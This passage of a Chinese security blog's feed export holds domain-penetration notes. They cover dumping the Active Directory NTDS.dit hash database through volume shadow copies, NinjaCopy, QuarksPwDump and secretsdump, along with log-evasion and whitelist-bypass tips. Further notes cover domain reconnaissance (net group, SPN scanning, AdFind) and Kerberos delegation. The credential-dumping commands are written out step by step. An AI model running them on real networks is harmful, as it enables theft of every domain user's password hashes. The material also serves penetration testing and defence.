class="line">1</span><br></pre></td><td class="code"><pre><span class="line">psexec.py -k ws02.lab.local -debug -no-pass</span><br></pre></td></tr></table></figure><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/2019-04-14-15-18-32.png" alt="img"></p><p>尝试复现上述过程，捣鼓了一天失败了。报的错是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[-] Connection against target ldaps://OWA2010SP3.0day.org FAILED: invalid server address</span><br><span class="line">[-] Exception in HTTP request handler: invalid server address</span><br><span class="line">[-] Exception in HTTP request handler: [Errno 104] Connecti</span><br></pre></td></tr></table></figure><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1567412692189.png" alt="1567412692189"></p><p>LDAPS安装过程：<a href="https://gist.github.com/magnetikonline/0ccdabfec58eb1929c997d22e7341e45" target="_blank" rel="noopener">https://gist.github.com/magnetikonline/0ccdabfec58eb1929c997d22e7341e45</a></p><p>上述原文地址：<a href="https://chryzsh.github.io/relaying-delegation/" target="_blank" rel="noopener">https://chryzsh.github.io/relaying-delegation/</a></p><p>如有知道为什么的，请联系我谢谢~</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3&gt;&lt;span id=&quot;相关概念&quot;&gt;相关概念&lt;/span&gt;&lt;/h3&gt;&lt;h4&gt;&lt;span id=&quot;ntlm-hash-和-net-ntlm-hash&quot;&gt;NTLM hash 和 Net-NTLM hash&lt;/span&gt;&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;NTLM hash是指Wind
      
    
    </summary>
    
      <category term="笔记" scheme="https://uknowsec.cn/categories/notes/"/>
    
    
  </entry>
  
  <entry>
    <title>域渗透-获取NTDS.dit</title>
    <link href="https://uknowsec.cn/posts/notes/%E5%9F%9F%E6%B8%97%E9%80%8F-%E8%8E%B7%E5%8F%96NTDS.dit.html"/>
    <id>https://uknowsec.cn/posts/notes/域渗透-获取NTDS.dit.html</id>
    <published>2019-08-29T14:17:17.000Z</published>
    <updated>2019-08-29T14:50:59.899Z</updated>
    
    <content type="html"><![CDATA[<h3><span id="ntdsdit">Ntds.dit</span></h3><p>Ntds.dit是主要的AD数据库，包括有关域用户，组和组成员身份的信息。它还包括域中所有用户的密码哈希值。为了进一步保护密码哈希值，使用存储在SYSTEM注册表配置单元中的密钥对这些哈希值进行加密。</p><h3><span id="volume-shadow-copy">Volume Shadow Copy</span></h3><p>Volume Shadow Copy Service 是微软从 Windows XP 开始提供的用于创建一致性的时间点副本（也就是快照）的服务框架。</p><ul><li>用于数据备份</li><li>支持Windows Server 2003 及以上操作系统</li><li>系统默认在特定条件下自动创建数据备份，如补丁安装后。在Win7系统大概每隔一周自动创建备份，该时间无法确定</li><li>禁用VSS会影响系统正常使用，如 System Restore和 Windows Server Backup</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">hash数量：所有用户</span><br><span class="line">免杀：不需要</span><br><span class="line">优点：</span><br><span class="line">    获得信息全面</span><br><span class="line">    简单高效</span><br><span class="line">    无需下载ntds.dit，隐蔽性高</span><br></pre></td></tr></table></figure><h3><span id="通过volume-shadow-copy获得域控服务器ntdsdit文件">通过Volume Shadow Copy获得域控服务器NTDS.dit文件</span></h3><p>调用Volume Shadow Copy服务会产生日志文件，位于System下，Event ID为7036</p><p>执行<code>ntdsutil snapshot &quot;activate instance ntds&quot; create quit quit</code>会额外产生Event ID为98的日志文件</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1567072575027.png" alt="1567072575027"></p><h4><span id="ntdsutil">ntdsutil</span></h4><p>域环境默认安装</p><p>支持系统：</p><ul><li>Server 2003</li><li>Server 2008</li><li>Server 2012</li></ul><h5><span id="利用过程">利用过程</span></h5><ol><li>查询当前系统的快照</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ntdsutil snapshot &quot;List All&quot; quit quit</span><br><span class="line">ntdsutil snapshot &quot;List Mounted&quot; quit quit</span><br></pre></td></tr></table></figure><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1567066641949.png" alt="1567066641949"></p><ol><li>创建快照</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntdsutil snapshot &quot;activate instance ntds&quot; create quit quit</span><br></pre></td></tr></table></figure><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1567066696011.png" alt="1567066696011"></p><p>guid为{78a8e3a8-cc4f-4d40-a303-d7a159c5a2aa}</p><ol><li>挂载快照</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntdsutil snapshot &quot;mount &#123;78a8e3a8-cc4f-4d40-a303-d7a159c5a2aa&#125;&quot; quit quit</span><br></pre></td></tr></table></figure><p>快照挂载为<code>C:\$SNAP_201908291617_VOLUMEC$\</code></p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1567066783567.png" alt="1567066783567"></p><ol><li><p>复制ntds.dit</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy C:\$SNAP_201908291617_VOLUMEC$\windows\NTDS\ntds.dit c:\ntds.dit</span><br></pre></td></tr></table></figure><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1567067029190.png" alt="1567067029190"></p></li></ol><ol><li><p>卸载快照</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntdsutil snapshot  &quot;unmount &#123;78a8e3a8-cc4f-4d40-a303-d7a159c5a2aa&#125;&quot; quit quit</span><br></pre></td></tr></table></figure></li></ol><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1567067157868.png" alt="1567067157868"></p><ol><li><p>删除快照</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntdsutil snapshot  &quot;delete &#123;78a8e3a8-cc4f-4d40-a303-d7a159c5a2aa&#125;&quot; quit quit</span><br></pre></td></tr></table></figure></li></ol><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1567067193739.png" alt="1567067193739"></p><h4><span id="vssadmin">vssadmin</span></h4><p>域环境默认安装</p><p>支持系统：</p><ul><li>Server 2008</li><li>Server 2012</li></ul><h5><span id="利用过程">利用过程</span></h5><ol><li><p>查询当前系统的快照</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vssadmin list shadows</span><br></pre></td></tr></table></figure></li><li><p>创建快照</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vssadmin create shadow /for=c:</span><br></pre></td></tr></table></figure><p>获得Shadow Copy Volume Name为<code>\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2</code></p></li></ol><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1567068293370.png" alt="1567068293370"></p><ol><li><p>复制ntds.dit</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\NTDS\ntds.dit c:\ntds.dit</span><br></pre></td></tr></table></figure></li><li><p>删除快照</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vssadmin delete shadows /for=c: /quiet</span><br></pre></td></tr></table></figure><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1567068417353.png" alt="1567068417353"></p></li></ol><h4><span id="vshadowexe">vshadow.exe</span></h4><p>系统默认不支持,，可在Microsoft Windows Software Development Kit (SDK)中获得该工具</p><h5><span id="利用过程">利用过程</span></h5><ol><li><p>查询当前系统的快照</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vshadow.exe -q</span><br></pre></td></tr></table></figure></li><li><p>创建快照</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vshadow.exe -p -nw C:</span><br></pre></td></tr></table></figure><p>获得SnapshotSetID、SnapshotID以及Shadow copy device name。</p></li><li><p>复制ntds.dit</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy Shadow copy device name\windows\NTDS\ntds.dit c:\ntds.dit</span><br></pre></td></tr></table></figure></li><li><p>删除快照</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vshadow -dx=&#123;SnapshotSetID&#125;</span><br></pre></td></tr></table></figure><p>or</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vshadow -ds=&#123;SnapshotID&#125;</span><br></pre></td></tr></table></figure></li></ol><h5><span id="利用vshadow执行命令">利用vshadow执行命令</span></h5><p>参考资料：</p><p><a href="https://bohops.com/2018/02/10/vshadow-abusing-the-volume-shadow-service-for-evasion-persistence-and-active-directory-database-extraction/" target="_blank" rel="noopener">https://bohops.com/2018/02/10/vshadow-abusing-the-volume-shadow-service-for-evasion-persistence-and-active-directory-database-extraction/</a></p><p>执行命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vshadow.exe -nw -exec=c:\windows\system32\notepad.exe c:</span><br></pre></td></tr></table></figure><p>执行后，后台存在进程VSSVC.exe，同时显示服务Volume Shadow Copy正在运行，需要手动关闭进程VSSVC.exe</p><p><strong>注：</strong></p><p>手动关闭进程VSSVC.exe会生成日志7034</p><p>利用思路：</p><p>vshadow.exe包含微软签名，能绕过某些白名单的限制。如果作为启动项，Autoruns的默认启动列表不显示</p><h3><span id="通过ninjacopy获得域控服务器ntdsdit文件">通过NinjaCopy获得域控服务器NTDS.dit文件</span></h3><p>下载地址：</p><p><a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1" target="_blank" rel="noopener">https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1</a></p><p>没有调用Volume Shadow Copy服务，所以不会产生日志文件7036</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\invoke-NinjaCopy.ps1</span><br><span class="line">Invoke-NinjaCopy -Path C:\Windows\System32\config\SAM -LocalDestination .\sam.hive</span><br><span class="line">Invoke-NinjaCopy -Path   C:\Windows\System32\config\SYSTEM -LocalDestination .\system.hive</span><br><span class="line">Invoke-NinjaCopy -Path &quot;C:\windows\ntds\ntds.dit&quot; -LocalDestination &quot;C:\Users\Administrator\Desktop\ntds.dit&quot;</span><br></pre></td></tr></table></figure><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1567087134171.png" alt="1567087134171"></p><h3><span id="quarkspwdump">QuarksPwDump</span></h3><p>Quarks PwDump 是一款开放源代码的Windows用户凭据提取工具，它可以抓取windows平台下多种类型的用户凭据，包括：本地<a href="https://www.webshell.cc/tag/帐户" target="_blank" rel="noopener">帐户</a>、域<a href="https://www.webshell.cc/tag/帐户" target="_blank" rel="noopener">帐户</a>、缓存的域帐户和Bitlocker。</p><p>修复复制出来的数据库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">esentutl /p /o ntds.dit</span><br></pre></td></tr></table></figure><p>使用QuarksPwDump直接读取信息并将结果导出至文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">QuarksPwDump.exe --dump-hash-domain --output 0day.org.txt --ntds-file c:\ntds.dit</span><br></pre></td></tr></table></figure><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1567088633983.png" alt="1567088633983"></p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1567088679203.png" alt="1567088679203"></p><h3><span id="secretsdumppy">secretsdump.py</span></h3><p>可以用impacket 套件中的 secretsdump.py 脚本去解密，速度有点忙。也可以用mimikatz解密，但是感觉还是QuarksPwDump比较快。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># secretsdump.exe -sam sam.hiv -security security.hiv -system sys.hiv LOCAL</span><br><span class="line"># secretsdump.exe -system system.hive -ntds ntds.dit LOCAL</span><br></pre></td></tr></table></figure><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1567089680113.png" alt="1567089680113"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3&gt;&lt;span id=&quot;ntdsdit&quot;&gt;Ntds.dit&lt;/span&gt;&lt;/h3&gt;&lt;p&gt;Ntds.dit是主要的AD数据库，包括有关域用户，组和组成员身份的信息。它还包括域中所有用户的密码哈希值。为了进一步保护密码哈希值，使用存储在SYSTEM注册表配置单元中的密钥对这些哈希
      
    
    </summary>
    
      <category term="笔记" scheme="https://uknowsec.cn/categories/notes/"/>
    
    
  </entry>
  
  <entry>
    <title>域渗透-域内信息收集</title>
    <link href="https://uknowsec.cn/posts/notes/%E5%9F%9F%E6%B8%97%E9%80%8F-%E5%9F%9F%E5%86%85%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86.html"/>
    <id>https://uknowsec.cn/posts/notes/域渗透-域内信息收集.html</id>
    <published>2019-08-27T14:17:17.000Z</published>
    <updated>2019-08-28T15:13:44.675Z</updated>
    
    <content type="html"><![CDATA[<h3><span id="常用收集域信息命令">常用收集域信息命令</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Net use</span><br><span class="line">Net view</span><br><span class="line">Tasklist /v</span><br><span class="line">Ipconfig /all </span><br><span class="line">net group /domain 获得所有域用户组列表</span><br><span class="line">net group “domain admins” /domain 获得域管理员列表</span><br><span class="line">net group “enterprise admins” /domain 获得企业管理员列表</span><br><span class="line">net localgroup administrators /domain 获取域内置administrators组用户（enterprise admins、domain admins）</span><br><span class="line">net group “domain controllers” /domain 获得域控制器列表</span><br><span class="line">net group “domain computers” /domain 获得所有域成员计算机列表</span><br><span class="line">net user /domain 获得所有域用户列表</span><br><span class="line">net user someuser /domain 获得指定账户someuser的详细信息</span><br><span class="line">net accounts /domain 获得域密码策略设置，密码长短，错误锁定等信息</span><br><span class="line">nltest /domain_trusts 获取域信任信息</span><br></pre></td></tr></table></figure><h3><span id="spn扫描">SPN扫描</span></h3><p>不同于常规的tcp/udp端口扫描，由于spn本质就是正常的Kerberos请求，所以扫描是非常隐蔽，日前针对此类扫描的检测暂时也比较少。</p><p>大部分win系统默认已自带spn探测工具即：<code>setspn.exe</code></p><p>此操作无需管理权限</p><p>域内机器执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn -T target.com -Q */*</span><br></pre></td></tr></table></figure><p>可完整查出当前域内所有spn。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">Checking domain DC=rootkit,DC=org</span><br><span class="line">CN=OWA2013,OU=Domain Controllers,DC=rootkit,DC=org</span><br><span class="line">IMAP/OWA2013</span><br><span class="line">IMAP/OWA2013.rootkit.org</span><br><span class="line">IMAP4/OWA2013</span><br><span class="line">IMAP4/OWA2013.rootkit.org</span><br><span class="line">POP/OWA2013</span><br><span class="line">POP/OWA2013.rootkit.org</span><br><span class="line">POP3/OWA2013</span><br><span class="line">POP3/OWA2013.rootkit.org</span><br><span class="line">exchangeRFR/OWA2013</span><br><span class="line">exchangeRFR/OWA2013.rootkit.org</span><br><span class="line">exchangeMDB/OWA2013</span><br><span class="line">exchangeMDB/OWA2013.rootkit.org</span><br><span class="line">SMTP/OWA2013</span><br><span class="line">SMTP/OWA2013.rootkit.org</span><br><span class="line">SmtpSvc/OWA2013</span><br><span class="line">SmtpSvc/OWA2013.rootkit.org</span><br><span class="line">exchangeAB/OWA2013</span><br><span class="line">exchangeAB/OWA2013.rootkit.org</span><br><span class="line">Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/OWA2013.rootkit.org</span><br><span class="line">ldap/OWA2013.rootkit.org/ForestDnsZones.rootkit.org</span><br><span class="line">ldap/OWA2013.rootkit.org/DomainDnsZones.rootkit.org</span><br><span class="line">TERMSRV/OWA2013</span><br><span class="line">TERMSRV/OWA2013.rootkit.org</span><br><span class="line">DNS/OWA2013.rootkit.org</span><br><span class="line">GC/OWA2013.rootkit.org/rootkit.org</span><br><span class="line">RestrictedKrbHost/OWA2013.rootkit.org</span><br><span class="line">RestrictedKrbHost/OWA2013</span><br><span class="line">RPC/58650e64-9681-4c62-b26e-7914b9041f72._msdcs.rootkit.org</span><br><span class="line">HOST/OWA2013/ROOTKIT</span><br><span class="line">HOST/OWA2013.rootkit.org/ROOTKIT</span><br><span class="line">HOST/OWA2013</span><br><span class="line">HOST/OWA2013.rootkit.org</span><br><span class="line">HOST/OWA2013.rootkit.org/rootkit.org</span><br><span class="line">E3514235-4B06-11D1-AB04-00C04FC2DCD2/58650e64-9681-4c62-b26e-7914b9041f72/rootkit.org</span><br><span class="line">ldap/OWA2013/ROOTKIT</span><br><span class="line">ldap/58650e64-9681-4c62-b26e-7914b9041f72._msdcs.rootkit.org</span><br><span class="line">ldap/OWA2013.rootkit.org/ROOTKIT</span><br><span class="line">ldap/OWA2013</span><br><span class="line">ldap/OWA2013.rootkit.org</span><br><span class="line">ldap/OWA2013.rootkit.org/rootkit.org</span><br><span class="line">CN=krbtgt,CN=Users,DC=rootkit,DC=org</span><br><span class="line">kadmin/changepw</span><br><span class="line">CN=dbadmin,OU=运维部,DC=rootkit,DC=org</span><br><span class="line">MSSQLSvc/Srv-Web-Kit.rootkit.org:1433</span><br><span class="line">MSSQLSvc/Srv-Web-Kit.rootkit.org</span><br><span class="line">CN=SRV-WEB-KIT,CN=Computers,DC=rootkit,DC=org</span><br><span class="line">TERMSRV/SRV-WEB-KIT</span><br><span class="line">TERMSRV/Srv-Web-Kit.rootkit.org</span><br><span class="line">WSMAN/Srv-Web-Kit</span><br><span class="line">WSMAN/Srv-Web-Kit.rootkit.org</span><br><span class="line">RestrictedKrbHost/SRV-WEB-KIT</span><br><span class="line">HOST/SRV-WEB-KIT</span><br><span class="line">RestrictedKrbHost/Srv-Web-Kit.rootkit.org</span><br><span class="line">HOST/Srv-Web-Kit.rootkit.org</span><br><span class="line">CN=PC-JERRY-KIT,CN=Computers,DC=rootkit,DC=org</span><br><span class="line">RestrictedKrbHost/PC-JERRY-KIT</span><br><span class="line">HOST/PC-JERRY-KIT</span><br><span class="line">RestrictedKrbHost/PC-jerry-Kit.rootkit.org</span><br><span class="line">HOST/PC-jerry-Kit.rootkit.org</span><br><span class="line">CN=PC-MICLE-KIT,CN=Computers,DC=rootkit,DC=org</span><br><span class="line">RestrictedKrbHost/PC-MICLE-KIT</span><br><span class="line">HOST/PC-MICLE-KIT</span><br><span class="line">RestrictedKrbHost/PC-micle-Kit.rootkit.org</span><br><span class="line">HOST/PC-micle-Kit.rootkit.org</span><br><span class="line">CN=PC-TORNDO-KIT,CN=Computers,DC=rootkit,DC=org</span><br><span class="line">HOST/PC-TORNDO-KIT</span><br><span class="line">HOST/pc-torndo-Kit.rootkit.org</span><br><span class="line">CN=sqladmin,OU=运维部,DC=rootkit,DC=org</span><br><span class="line">variant/golden</span><br><span class="line"></span><br><span class="line">Existing SPN found!</span><br></pre></td></tr></table></figure><h3><span id="定位域控">定位域控</span></h3><h4><span id="查询dns解析记录">查询dns解析记录</span></h4><p>若当前主机的dns为域内dns，可通过查询dns解析记录定位域控。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nslookup -type=all _ldap._tcp.dc._msdcs.rootkit.org</span><br></pre></td></tr></table></figure><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1566979004463.png" alt="1566979004463"></p><h4><span id="spn扫描">SPN扫描</span></h4><p>在SPN扫描结果中可以通过<code>CN=OWA2013,OU=Domain Controllers,DC=rootkit,DC=org</code>来进行域控的定位。</p><h4><span id="net-group">net group</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group &quot;domain controllers&quot; /domain</span><br></pre></td></tr></table></figure><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1566979395890.png" alt="1566979395890"></p><h4><span id="端口识别">端口识别</span></h4><p>扫描内网中同时开放389和53端口的机器。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">端口：389</span><br><span class="line">服务：LDAP、ILS</span><br><span class="line">说明：轻型目录访问协议和NetMeeting Internet Locator Server共用这一端口。</span><br><span class="line"></span><br><span class="line">端口：53</span><br><span class="line">服务：Domain Name Server（DNS）</span><br><span class="line">说明：53端口为DNS(Domain Name Server，域名服务器)服务器所开放，主要用于域名解析，DNS服务在NT系统中使用的最为广泛。通过DNS服务器可以实现域名与IP地址之间的转换，只要记住域名就可以快速访问网站。</span><br></pre></td></tr></table></figure><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1566979627122.png" alt="1566979627122"></p><h3><span id="域内关键组">域内关键组</span></h3><p>比如在拿到域控后可以通过重点关注关键部门人员的机器来得到更多的信息。</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1566980640086.png" alt="1566980640086"></p><p>以上图为例，我们可以重点关注和监控运维部的用户机器，通常他们的机器上存在大量内网网络拓扑和网络构架信息或者是一些重要的密码本。</p><h3><span id="adfind">AdFind</span></h3><p>C++实现(未开源)，用于查询域内信息</p><p><a href="http://www.joeware.net/freetools/tools/adfind/index.htm" target="_blank" rel="noopener">http://www.joeware.net/freetools/tools/adfind/index.htm</a></p><p>常用命令如下：</p><p>列出域控制器名称：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind -sc dclist</span><br></pre></td></tr></table></figure><p>查询当前域中在线的计算机：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind -sc computers_active</span><br></pre></td></tr></table></figure><p>查询当前域中在线的计算机(只显示名称和操作系统)：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind -sc computers_active name operatingSystem</span><br></pre></td></tr></table></figure><p>查询当前域中所有计算机：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind -f &quot;objectcategory=computer&quot;</span><br></pre></td></tr></table></figure><p>查询当前域中所有计算机(只显示名称和操作系统)：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind -f &quot;objectcategory=computer&quot; name operatingSystem</span><br></pre></td></tr></table></figure><p>查询域内所有用户：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind -users name</span><br></pre></td></tr></table></figure><p>查询所有GPO：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind -sc gpodmp</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3&gt;&lt;span id=&quot;常用收集域信息命令&quot;&gt;常用收集域信息命令&lt;/span&gt;&lt;/h3&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;
      
    
    </summary>
    
      <category term="笔记" scheme="https://uknowsec.cn/categories/notes/"/>
    
    
  </entry>
  
  <entry>
    <title>域渗透-Delegation</title>
    <link href="https://uknowsec.cn/posts/notes/%E5%9F%9F%E6%B8%97%E9%80%8F-Delegation.html"/>
    <id>https://uknowsec.cn/posts/notes/域渗透-Delegation.html</id>
    <published>2019-08-26T14:17:17.000Z</published>
    <updated>2019-08-28T15:16:57.021Z</updated>
    
    <content type="html"><![CDATA[<h3><span id="委派">委派</span></h3><p>在域中如果出现A使用Kerberos身份验证访问域中的服务B，而B再利用A的身份去请求域中的服务C，这个过程就可以理解为委派。</p><p><img src="https://image.3001.net/images/20190315/1552649799_5c8b8e47c2172.png" alt="img"></p><p>User访问主机s2上的HTTP服务，而HTTP服务需要请求其他主机的SQLServer数据库，但是S2并不知道User是否有权限访问SQLServer，这时HTTP服务会利用User的身份去访问SQLServer，如果User有权限访问SQLServer服务才能访问成功。</p><p>而委派主要分为非约束委派（Unconstraineddelegation）和约束委派（Constrained delegation）两个方式。</p><h4><span id="非约束委派">非约束委派</span></h4><p>非约束委派在Kerberos中实现时，User会将从KDC处得到的TGT发送给访问的service1（可以是任意服务），service1拿到TGT之后可以通过TGT访问域内任意其他服务，所以被称为非约束委派。</p><p><img src="https://image.3001.net/images/20190315/1552649941_5c8b8ed5b18f6.png" alt="img"></p><p><strong>流程：</strong></p><blockquote><ol><li><p>用户通过发送KRB_AS_REQ消息请求可转发 TGT（forwardable TGT，为了方便我们称为TGT1）。</p></li><li><p>KDC在KRB_AS_REP消息中返回TGT1。</p></li><li><p>用户再通过TGT1向KDC请求转发TGT（forwardedTGT，我们称为TGT2）。</p></li><li><p>在KRB_TGS_REP消息中返回转发TGT2。</p></li><li><p>用户使用TGT1向KDC申请访问Service1的ST（ServiceTicket）。</p></li><li><p>TGS返回给用户一个ST。</p></li><li><p>用户发送KRB_AP_REQ请求至Service1，这个请求中包含了TGT1和ST、TGT2、TGT2的SessionKey。</p></li><li><p>Service1使用用户的TGT2通过KRB_TGS_REQ发送给KDC，以用户的名义请求能够访问Service2的票据。</p></li><li><p>KDC在KRB_TGS_REP消息中返回Service2到Service1的票据。</p></li><li><p>Service1以用户的名义像Service2发送KRB_AP_REQ请求。</p></li><li><p>Service2响应步骤10中Service1的请求。</p></li><li><p>Service1响应步骤7中用户的请求。</p></li><li><p>在这个过程中的TGT转发机制，没有限制Service1对TGT2的使用，也就是说Service1可以通过TGT2来请求任意服务。</p></li><li><p>KDC返回步骤13中请求的票据。</p></li></ol><p>15和16即为Service1通过模拟用户来访问其他Service。</p></blockquote><p>可以看到在前5个步骤中User向KDC申请了两个TGT（步骤2和4），一个用于访问Service1一个用于访问Service2，并且会将这两个都发给Service1。并且Service1会将TGT2保存在内存中。</p><p><strong>非约束委派的设置：</strong></p><p>Windows域中可以直接在账户属性中设置：</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1566916812731.png" alt="1566916812731"></p><h4><span 